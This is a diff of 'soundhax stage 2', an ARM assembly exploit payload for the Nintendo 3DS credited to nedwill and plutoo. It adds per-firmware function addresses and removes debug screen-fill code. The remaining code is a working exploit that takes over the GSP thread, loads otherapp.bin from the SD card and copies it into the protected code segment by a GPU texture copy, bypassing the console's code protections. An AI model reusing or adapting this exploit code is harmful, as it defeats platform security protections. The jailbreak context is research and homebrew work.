@@ -1,48 +1,77 @@
 /* soundhax stage 2 */
 /* ported by nedwill from freakyhax (plutoo), with permission */
 
-//#define NEW /* new or old? */
-
 #if defined(USA)
 
 #define GSP_THREAD_OBJ_PTR  0x003BFFF0
 #define FS_OPEN_FILE 0x0022929C
-#define FS_READ_FILE 0x002C4204
 #define GSP_GET_HANDLE 0x0021C960
-#define GSP_GX_CMD4 0x002E9390
-#define GSP_FLUSH_DATA_CACHE 0x002E2950
 #define GSP_GET_INTERRUPTRECEIVER 0x001C805C
 #define GSP_ENQUEUE_CMD 0x001C7BF4
-#define GSP_WRITE_HW_REGS 0x002D5810
-#define FS_MOUNT_SDMC 0x0011FA90
+
+#if defined(V21AND22)
+
+#define FS_READ_FILE 0x002C41F4
+#define GSP_GX_CMD4 0x002E9380
+#define GSP_FLUSH_DATA_CACHE 0x002E2940
+
+#else
+
+#define FS_READ_FILE 0x002C4204
+#define GSP_GX_CMD4 0x002E9390
+#define GSP_FLUSH_DATA_CACHE 0x002E2950
+
+#endif
 
 #elif defined(EUR)
 
 #define GSP_THREAD_OBJ_PTR  0x003C0010
 #define FS_OPEN_FILE 0x0022929C
-#define FS_READ_FILE 0x002C4374
 #define GSP_GET_HANDLE 0x0021C960
-#define GSP_GX_CMD4 0x002E9500
-#define GSP_FLUSH_DATA_CACHE 0x002E2AC0
 #define GSP_GET_INTERRUPTRECEIVER 0x001C805C
 #define GSP_ENQUEUE_CMD 0x001C7BF4
-#define GSP_WRITE_HW_REGS 0x002D5940
-#define FS_MOUNT_SDMC 0x0011FA90
+
+#if defined(V21AND22)
+
+#define FS_READ_FILE 0x002C4364
+#define GSP_GX_CMD4 0x002E94F0
+#define GSP_FLUSH_DATA_CACHE 0x002E2AB0
+
+#else
+
+#define FS_READ_FILE 0x002C4374
+#define GSP_GX_CMD4 0x002E9500
+#define GSP_FLUSH_DATA_CACHE 0x002E2AC0
+
+#endif
 
 #elif defined(JPN)
 
 #define GSP_THREAD_OBJ_PTR  0x003BFFB0
 #define FS_OPEN_FILE 0x0022929C
-#define FS_READ_FILE 0x002C40DC
 #define GSP_GET_HANDLE 0x0021C960
-#define GSP_GX_CMD4 0x002E9268
-#define GSP_FLUSH_DATA_CACHE 0x002E2828
 #define GSP_GET_INTERRUPTRECEIVER 0x001C805C
 #define GSP_ENQUEUE_CMD 0x001C7BF4
-#define GSP_WRITE_HW_REGS 0x002D56E8
-#define FS_MOUNT_SDMC 0x0011FA90
+
+#if defined(V21AND22)
+
+#define FS_READ_FILE 0x002C40CC
+#define GSP_GX_CMD4 0x002E9258
+#define GSP_FLUSH_DATA_CACHE 0x002E2818
+
+#else
+
+#define FS_READ_FILE 0x002C40DC
+#define GSP_GX_CMD4 0x002E9268
+#define GSP_FLUSH_DATA_CACHE 0x002E2828
+
+#endif
 
 #elif defined(KOR)
+
+#if defined(V21AND22)
+#error "KOR region supported for this firmware version"
+#endif
 
 #define SRV_SESSIONHANDLE 0x0038d1c4
 #define SRV_SEMAPHORE 0x0038d1b4
@@ -55,11 +84,9 @@
 #define GSP_FLUSH_DATA_CACHE 0x0012B728
 #define GSP_GET_INTERRUPTRECEIVER 0x00223880
 #define GSP_ENQUEUE_CMD 0x0022109C
-#define GSP_WRITE_HW_REGS 0x0012BAC8
-#define FS_MOUNT_SDMC 0x001604B8
 
 #else
-#error "not support region"
+#error "region not supported"
 #endif
 
 #define OTHERAPP_ADDR 0x142C0000
@@ -70,19 +97,15 @@
 #define OTHERAPP_CODE_PA 0x27a01000
 #else
 /* OTHERAPP_CODE_VA + 0x23D00000 */
-#if defined(PRE5)
-#define OTHERAPP_CODE_PA 0x23e01000 - 0x78000
-#elif defined(POST5)
+#if defined(POST5)
 #define OTHERAPP_CODE_PA 0x23e01000
+#else
+#define OTHERAPP_CODE_PA 0x23e01000 - 0x78000
 #endif
 #endif
 #define OTHERAPP_CODE_GPU (OTHERAPP_CODE_PA - 0xc000000)
 
 #define PARAMBLK_ADDR 0x14000000
-
-#define FRAMEBUF_ADDR 0x14200000
-#define FRAMEBUF_ADDR_GPU 0x20200000
-#define FRAMEBUF_SIZE (400*240*4)
 
 .text
 .global _start
@@ -90,10 +113,6 @@ _start:
 /* Initialize stack. */
     mov  sp, #0x10000000
     sub  sp, #0x2C
-    bl   framebuffer_reset
-/* Red screen. */
-    ldr  r0, =0xFF0000FF
-    bl   framebuffer_fill
 /* Tell GSP thread to fuck off. */
     ldr  r0, =GSP_THREAD_OBJ_PTR
 #if defined(KOR)
@@ -133,16 +152,12 @@ _start:
     str  r4, [sp, #4]   // size
     ldr  r4, =FS_READ_FILE
     blx  r4
-//    .word 0xFFFFFFFF // debug crash
 /* Gspwn it to code segment. */
     ldr  r0, =OTHERAPP_CODE_GPU // dst
     ldr  r1, =OTHERAPP_ADDR // src
     ldr  r2, =OTHERAPP_SIZE // size
     bl   gsp_gxcmd_texturecopy
     bl   small_sleep
-/* Green screen. */
-    ldr  r0, =0x00FF00FF
-    bl   framebuffer_fill
 /* Grab GSP handle for next payload. */
     ldr  r0, =GSP_GET_HANDLE
     blx  r0
@@ -170,15 +185,6 @@ forever:
 otherapp_str:
     .string16 "$sndsd:/otherapp.bin\0"
     .align 4
-
-/* memcpy32: Copy r2 bytes from r1 to r0, 32 bits at a time. */
-memcpy32:
-    cmp  r2, #0
-    bxeq lr
-    ldr  r3, [r1], #4
-    str  r3, [r0], #4
-    sub  r2, #4
-    b    memcpy32
 
 /* small_sleep: Sleep for a while. */
 small_sleep:
@@ -219,61 +225,6 @@ gsp_execute_gpu_cmd:
     ldr  r4, =GSP_ENQUEUE_CMD
     blx  r4
     pop  {pc}
-.pool
-
-/* framebuffer_reset: Setup framebuffer to point to FRAMEBUF_ADDR. */
-framebuffer_reset:
-    push {lr}
-    ldr  r0, =0x00400468
-    bl   set_fb_register
-    ldr  r0, =0x0040046C
-    bl   set_fb_register
-    ldr  r0, =0x00400494
-    bl   set_fb_register
-    ldr  r0, =0x00400498
-    bl   set_fb_register
-
-    ldr  r3, =GSP_WRITE_HW_REGS
-    ldr  r0, =0x00400470
-    adr  r1, __fb_format
-    mov  r2, #4
-    blx  r3
-
-    ldr  r3, =GSP_WRITE_HW_REGS
-    ldr  r0, =0x0040045C
-    adr  r1, __fb_size
-    mov  r2, #4
-    blx  r3
-
-    pop  {pc}
-__fb_format:
-    .word (0 | (1<<6))
-__fb_size:
-    .word (240<<16) | (400)
-
-set_fb_register:
-    ldr  r3, =GSP_WRITE_HW_REGS
-    adr  r1, __fb_physaddr
-    mov  r2, #4
-    bx   r3
-__fb_physaddr:
-    .word FRAMEBUF_ADDR_GPU
-
-/* framebuffer_fill: Fill framebuffer with color in r0. */
-framebuffer_fill:
-    ldr   r1, =FRAMEBUF_ADDR
-    ldr   r2, =FRAMEBUF_SIZE
-    add   r2, r1
-__fill_loop:
-    str   r0, [r1]
-    add   r1, #4
-    cmp   r1, r2
-    bne   __fill_loop
-    ldr   r4, =GSP_FLUSH_DATA_CACHE
-    ldr   r0, =FRAMEBUF_ADDR
-    ldr   r1, =FRAMEBUF_SIZE
-    bx    r4
-
 .pool
 
 #if defined(SRV_SESSIONHANDLE)
